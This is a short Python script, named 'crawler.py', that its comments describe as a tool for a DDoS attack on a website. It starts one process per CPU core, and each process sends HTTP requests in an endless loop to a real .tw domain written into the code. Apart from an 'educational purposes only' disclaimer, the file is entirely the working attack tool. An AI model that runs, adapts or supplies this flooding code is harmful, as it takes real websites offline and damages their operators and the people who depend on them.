# Description: A simple script to perform a DDOS attack on a website using multiple processes.
# The script sends multiple requests to the website using the requests library.
# The number of processes is equal to the number of CPU cores on the machine.
# The script is intended for educational purposes only.
# Usage: python crawler.py
# Requirements: requests, BeautifulSoup, multiprocessing


import requests as rq
from bs4 import BeautifulSoup
import multiprocessing
import os

url = 'https://xn--iss931j.tw/'
session = rq.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0'})

def ddos():
    print(f'Process {os.getpid()} starting...')
    while True:
        try:
            res = session.get(url)
            print(f'Process {os.getpid()}: Status {res.status_code}')
        except Exception as e:
            print(f'Error in process {os.getpid()}: {e}')

if __name__ == '__main__':
    num_processes = multiprocessing.cpu_count()
    print(f'Starting {num_processes} processes')
    
    processes = []
    for _ in range(num_processes):
        p = multiprocessing.Process(target=ddos)
        p.start()
        processes.append(p)
    
    for p in processes:
        p.join()